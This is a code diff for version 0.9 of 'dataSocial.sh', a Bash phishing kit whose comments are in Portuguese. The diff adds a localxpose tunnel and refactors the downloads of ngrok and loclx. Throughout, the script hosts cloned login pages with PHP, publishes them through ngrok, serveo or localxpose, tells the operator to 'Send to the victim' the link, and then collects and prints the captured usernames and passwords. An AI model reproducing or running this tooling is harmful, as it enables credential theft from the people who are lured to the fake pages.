@@ -44,6 +44,8 @@
 #     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
 # v0.8 2023-08-31, Oliver Silva:
 #     Adicionado mais uma tela google e refatoração
+# v0.9 2023-9-15, Oliver Silva:
+#     Adicionado um proxy reverso localxspose
 #
 # Licença: MIT License
 #
@@ -55,6 +57,7 @@
 # Versão 0.6: Modo interativo adicionado
 # Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
 # Versão 0.8: Página do gooogle atualizada, refatoração.
+# Versão 0.9: Novo tunnel adicionado, refatoração.
 #
 
 trap interruptTwo SIGINT SIGTSTP
@@ -68,7 +71,13 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-# Checa serviço
+tunnelsLinks=(
+    "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
+    "https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
+)
+
+### Checa serviço
+
 checkService() {
     serviceSelected=$1
 
@@ -80,7 +89,9 @@ checkService() {
     fi
 }
 
-# Checa tunnel
+
+### Checa tunnel
+
 checkTunnel() {
     tunnelSelected=$1
     serviceSelected=$2
@@ -100,47 +111,33 @@ checkTunnel() {
     fi
 }
 
-verifyLinks() {
-    if [ "$1" == "null" -a "$2" == "null" ] ; then
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mNull Ngrok links, run this program in another proot shell type or run this program again\e[0m"
-    fi
-}
+
+
+### Interrompe processos e apaga arquivos
 
 interrupt() {
     echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mInterrupted program\e[0m"
-    processKill
+    killProcess
     removeFiles
     stty -echoctl
 }
+
+### Interrompe processo, apaga arquivos e sai do programa
 
 interruptTwo() {
     interrupt
     exit 1
 }
 
-listen() {
-    functionGroup
-}
 
-functionGroup() {
-    removeFiles
-    copyFiles
-    processKill
-    installReqIfNotExists
-    listenLocalhost
-
-    echo -e "\e[0m[!] Send to the victim:\e[0m"
-    showLink
-}
-
-listenLocalhost() {
-    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
-    sleep 3
-}
+### Apaga arquivos
 
 removeFiles() {
     [ -d ./www ] && rm ./www -rf
 }
+
+
+### Copia arquivos
 
 copyFiles() {
     service=$serviceSelected
@@ -152,73 +149,251 @@ copyFiles() {
 
     else
 	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
-	exit 1
     fi
 }
+
+
+
+### Mata todos os processos
+
+killProcess() {
+    [ $(ps -e | grep -Eo "php") ] && pkill php
+    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
+    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
+    [ $(ps -e | grep -Eo "loclx") ] && pkill loclx
+}
+
+
+### Extrai arquivos
+
+extract() {
+    tunnelName="$1"
+    arch="$2"
+
+    if [ "$tunnelName" == "ngrok" ] ; then
+	tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C tunnels/ > /dev/null
+
+    elif [ "$tunnelName" == "loclx" ] ; then
+	unzip loclx-linux-${arch}.zip -d tunnels/ > /dev/null
+
+    fi
+}
+
+
+### Instala uma ferramenta de tunnel se não existir
+
+installTunnel() {
+    case "$(dpkg --print-architecture)" in
+	aarch64) arch="arm64";;
+	armhf | arm) arch="arm";;
+	amd64) arch="amd64";;
+	x86_84) arch="amd64";;
+	i*86) arch="i386";;
+	i386) arch="i386";;
+    *)
+	echo "[!] Invalid architecture"
+	exit 1
+    esac
+
+
+    tunnelName="$1"
+    tunnelIndex="$2"
+
+    tunnelsLinks=(
+	"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
+	"https://api.localxpose.io/api/v2/downloads/loclx-linux-${arch}.zip"
+    )
+
+    if [ ! -f ./tunnels/$tunnelName ] ; then
+	printf "\r\e[33;1m[*] Installing $tunnelName...\e[0m"
+	curl -LO ${tunnelsLinks[$tunnelIndex]} > /dev/null 2>&1 &
+	
+	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
+	    printf "\r\e[33;1m[*] Installing $tunnelName..."
+	    
+    	done
+	printf "\r\e[33;1m[+] Installing $tunnelName...\e[32;1mOK\e[0m\n"
+	
+	while [ ! -f ./tunnels/$tunnelName ] ; do
+	    printf "\r\e[33;1m[*] Extracting $tunnelName...\e[0m"
+	    extract $tunnelName $arch
+	done
+	printf "\r\e[33;1m[+] Extracting $tunnelName...\e[32;1mOK\e[0m\n"
+	rm *.zip *.tgz > /dev/null 2>&1
+    fi
+
+}
+
+
+
+### Ativa servidor localmente
+
+listenServer() {
+    php -S ${host}:${port} -t ./www &> wait.log &
+    sleep 3
+    
+}
+
+
+### Grupo de funçôes
+
+groupFunction() {
+    removeFiles
+    copyFiles
+    killProcess
+}
+
+
+### Aguarde
+
+waitMessage() {
+    list="$1"
+
+    echo -e "\n"
+    for i in $(seq $list) ; do
+        printf "\r[*] Wait, please...$i/$list"
+	sleep 1
+    done
+    echo -e "\n\n"
+}
+
+
+### tunnels
 
 tunnel() {
     case "$tunnelSelected" in
 	"ngrok")
-	    ngrok http $port --log=stdout > /dev/null 2>&1 &
-            sleep 3
-            showLinkNgrok
+	    groupFunction
+	    installTunnel "ngrok" "0"
+	    listenServer
+	    ./tunnels/ngrok http $port --log=stdout &> wait.log &
+            waitMessage 3
+	    showLink "ngrok"
+	    
 	    ;;
+
         "ssh")
-	    ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net > /dev/null 3>&2 &
-	    sleep 3
-	    showLinkSSH
+	    groupFunction
+	    listenServer
+	    ./tunnels/ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net &> wait.log &
+	    waitMessage 2
+	    showLink "ssh"
 	    ;;
+
+	"loclx")
+	    groupFunction
+	    installTunnel "loclx" "1"
+	    listenServer
+	    ./tunnels/loclx tunnel --raw-mode http --https-redirect &> wait.log &
+	    waitMessage 10
+	    showLink "loclx"
+	    ;;
+
 	*)
-	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
-	    exit 1
+	    if [ -z "$tunnelSelected" ] ; then
+		groupFunction
+		listenServer
+		waitMessage 3
+		showLink "localhost"
+	    fi
+	    
+	    echo -e "\e[0m[\e[33;1m!\e[0m] Running without tunnel\e[0m"
 	    ;;
     esac
 }
 
 
-processKill() {
-    [ $(ps -e | grep -Eo "php") ] && pkill php
-    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
-    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
-}
+#### Mostra link
 
 showLink() {
-   echo -e "\e[0m[!] Localhost: \e[33;1m$host:$port\e[0m"
-}
+    checkReq && banner
+    tunnel="$1"
+    warnning="\n\e[31;1m$1 Null!. run this program in another proot shell type or run this program again.\nCommand: 'termux-chroot ./dataSocial.sh $args'\e[0m"
+    
+    echo -e "\e[0m[!] Send to the victim:\e[0m"
 
-showLinkNgrok() {
-    addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
-    public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")
-
-    verifyLinks $addr $public
-
-    echo -e "\e[0m[!] Ngrok localhost: \e[33;1m$addr\e[0m"
-    echo -e "\e[0m[!] Ngrok URL: \e[33;1m$public\e[0m"
-
-}
-
-showLinkSSH() {
-    ssh="$(ps -e | grep -Eo ssh)"
-
-    if [ -n "$ssh" ] ; then
-	echo -e "\e[0m[!] SSH serveo: \e[33;1mserveo.net:$port\e[0m"
-
-    else
-	echo -e "\e[0m[!] SSH serveo error\e[0m"
+    if [ "$tunnel" == "localhost" ] ; then
+	link="$(grep -o 'http://[-0-9a-z:]*' wait.log)"
 	
+	if [ -n "$link" ]; then
+	    echo -e "\e[0m[+] Localhost: \e[33;1m$link\e[0m"
+
+    	else
+	    echo -e "$warnning"
+	    interruptTwo
+	fi
+	
+
+    elif [ "$tunnel" == "ngrok" ] ; then
+	link="$(grep -o 'https://.[-0-9a-z]*.ngrok.io' wait.log)"
+
+	if [ -n "$link" ]; then
+	    echo -e "\e[0m[+] Ngrok: \e[33;1m$link\e[0m"
+
+    	else
+	    echo -e "$warnning"
+	    interruptTwo
+	fi
+	
+
+    elif [ "$tunnel" == "ssh" ] ; then
+	echo -e "\e[0m[!] SSH: \e[33;1mserveo.net:$port\e[0m"
+
+    elif [ "$tunnel" == "loclx" ] ; then
+	link="$(grep -o '[-0-9a-z.]*loclx.io' wait.log)"
+
+	if [ -n "$link" ]; then
+	    echo -e "\e[0m[+] Localxpose: \e[33;1m$link\e[0m"
+
+    	else
+	    echo -e "$warnning"
+	    interruptTwo
+	fi
     fi
 }
 
-getDataCaptured() {
-    get_ip
-    get_data
 
-    control
+
+### Mostra o ip
+
+get_ip() {
+    while [ ! -f ./www/ip.txt ] ; do
+	printf "\r\e[0m[*] Listening connection...\e[0m"
+    done
+
+    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
+    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"
+
 }
+
+
+### Mpstra os dados de acesso
+
+get_data() {
+    while [ ! -f ./www/src/dados.txt ] ; do 
+	printf "\r\e[0m[*] Waiting for credentials...\e[0m"
+    done
+
+    [ ! -d ./logs ] && mkdir logs
+
+    cat ./www/src/dados.txt > ./logs/dataSocial.txt
+    printf "\r\e[0m[+] Captured credentials:     \e[0m\n"
+    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"
+
+    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
+    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
+
+    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
+    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
+}
+
+
+
+### Repetir o teste
 
 control() {
     echo -e "\e[0mType 'ctr+C' OR 'quit' to cancel OR 'rerun' to rerun this attack\e[0m" ; read
-
+	
     if [ "$REPLY" == "rerun" ] ; then
 	rerun
 
@@ -230,33 +405,18 @@ control() {
     fi
 }
 
-get_ip() {
-    while [ ! -f ./www/ip.txt ] ; do
-	printf "\r\e[0m[-] Listening connection...\e[0m"
-    done
 
-    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
-    printf "\r\e[0m[+] New open connection: \e[33;1m$ip\e[0m\n"
 
+### Mostra o ip, dados de acesso e pergunta se repete o teste
+
+getDataCaptured() {
+    get_ip
+    get_data
+    control
 }
 
-get_data() {
-    while [ ! -f ./www/src/dados.txt ] ; do 
-	printf "\r\e[0m[-] Waiting for credentials...\e[0m"
-    done
 
-    [ ! -d ./logs ] && mkdir logs
 
-    cat ./www/src/dados.txt > ./logs/dataSocial.txt
-    printf "\r\e[0m[-] Captured credentials:     \e[0m\n"
-    printf "\r\e[0m[+] Your log is in \e[32mlogs/dataSocial.txt\e[0m\n"
-
-    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
-    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)
-
-    echo -e "\e[0m[+] Username: \e[32m$usuario\e[0m"
-    echo -e "\e[0m[+] Password: \e[32m$senha\e[0m"
-}
 
 banner() {
 echo -e "\e[34m
@@ -272,7 +432,7 @@ echo -e "\e[34m
           ' .  .  .  .  . '.    .'         '  '
 	     '         '    '. '              .
 	       '       '      '
-	         ' .  '   Site: programadorboard.epizy.com 
+	         ' .  '   Site: http://tiooliver.rf.gd 
 \e[0m"
 }
 
@@ -286,7 +446,10 @@ version() {
     grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
 }
 
+
 # Percorre a uma lista
+
+
 list() {
     array="$1"
     count=1
@@ -302,7 +465,7 @@ list() {
 
 # Checa pacotes necessários
 checkReq() {
-    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet")
+    listReq=("ssh" "tar" "php" "jq" "curl" "toilet" "figlet" "unzip")
 
     [ -d $PREFIX/bin ] && dir=$PREFIX/bin # Termux
     [ -d /usr/bin ] && dir=/usr/bin 	  # Proot, Chroot or others
@@ -321,47 +484,6 @@ checkReq() {
     done
 }
 
-installReqIfNotExists() {
-    [ -d /usr/bin ] && dir=/usr/bin
-    [ -d $PREFIX/bin ] && dir=$PREFIX/bin 
-
-    case "$(dpkg --print-architecture)" in
-	aarch64)
-	    arch="arm64";;
-        armhf | arm)
-	    arch="arm";;
-	amd64)
-	    arch="amd64";;
-	x86_84)
-	    arch="amd64";;
-	i*86)
-	    arch="i386";;
-	i386)
-	    arch="i386";;
-    *)
-	echo "[!] Invalid architecture"
-	exit 1
-    esac
-
-    link="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"
-
-    if [ ! -f ${dir}/ngrok ] ; then
-	printf "\r\e[33;1m[*] Installing Ngrok...\e[0m"
-	curl -LO $link > /dev/null 2>&1 &
-
-	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
-	    printf "\r\e[33;1m[*] Installing Ngrok..."
-	
-    	done
-	printf "\r\e[33;1m[+] Installing Ngrok...\e[32;1mOK\e[0m\n"
-	while [ ! -f ${dir}/ngrok ] ; do
-	    printf "\r\e[33;1m[*] Extracting Ngrok...\e[0m"
-	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $dir > /dev/null
-	done
-	printf "\r\e[33;1m[+] Extracting Ngrok...\e[32;1mOK\e[0m\n"
-	rm ngrok-v3-stable-linux-${arch}.tgz
-    fi
-}
 
 rerun() {
     echo -e "\e[0mRun that attack again? [y/n] : \e[0m" ; read
@@ -538,14 +660,14 @@ menu() {
 		    if [[ -n "$serviceSelected" ]] && 
 		       [[ -z "$tunnelSelected" ]] then
 			echo -e "\n\e[0mRunning the setup locally\e[0m..."
-			args="--listen --service $serviceSelected"
-			listen && getDataCaptured
+			args="--listenServer --service $serviceSelected"
+			tunnel && getDataCaptured
 
 		    elif [[ -n "$serviceSelected" ]] && 
 			[[ -n "$tunnelSelected" ]] ; then
 			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
-			args="--listen --service $serviceSelected --tunnel $tunnelSelected"
-			listen && tunnel && getDataCaptured
+			args="--listenServer --service $serviceSelected --tunnel $tunnelSelected"
+			tunnel && getDataCaptured
 
 		    else
 			echo -e "\n\e[0m\e[33;1m[!] No settings defined\e[0m"
@@ -588,8 +710,7 @@ banner_two() {
 
     echo -e "\n\n"
     toilet -f slant dataSocial --metal
-    count=1
-    total=$(for index in ./websites/*;do count=$((count +1)); done)
+
     echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m$(total_services)\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
     echo -e "\n\n"
 }
@@ -608,14 +729,16 @@ fi
 
 while [ -n "$1" ] ; do
     case "$1" in
-	-h | --help)
-	    helper;;
-	-v | --version)
-	    version && exit 0;;
+	-h | --help) helper;;
+	
+	-v | --version) version && exit 0;;
+	
 	-S | --services)
 	    list ./websites "services" && exit 0;;
+	
 	-T | --tunnels)
 	    list ./tunnels "tunnels" && exit 0;;
+	
 	-s | --service)
 	    shift
 
@@ -627,8 +750,9 @@ while [ -n "$1" ] ; do
 	    serviceKey=1
 	    serviceSelected="$1";;
 
-	-l | --listen)
+	-l | --listenServer)
 	    listenKey=1;;
+	
 	-t | --tunnel)
 	    shift
 
@@ -640,6 +764,7 @@ while [ -n "$1" ] ; do
 	    tunnelKey=1
 	    tunnelSelected="$1"
 	    ;;
+	
         -i | --interactive)
 	    checkReq
 	    interactiveMode;;
@@ -651,10 +776,10 @@ while [ -n "$1" ] ; do
 done
 
 if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
-    checkReq && banner && listen && getDataCaptured
+    tunnel && getDataCaptured
 
 elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
-    checkReq && banner && listen && tunnel && getDataCaptured
+    tunnel && getDataCaptured
 
 else
     checkReq
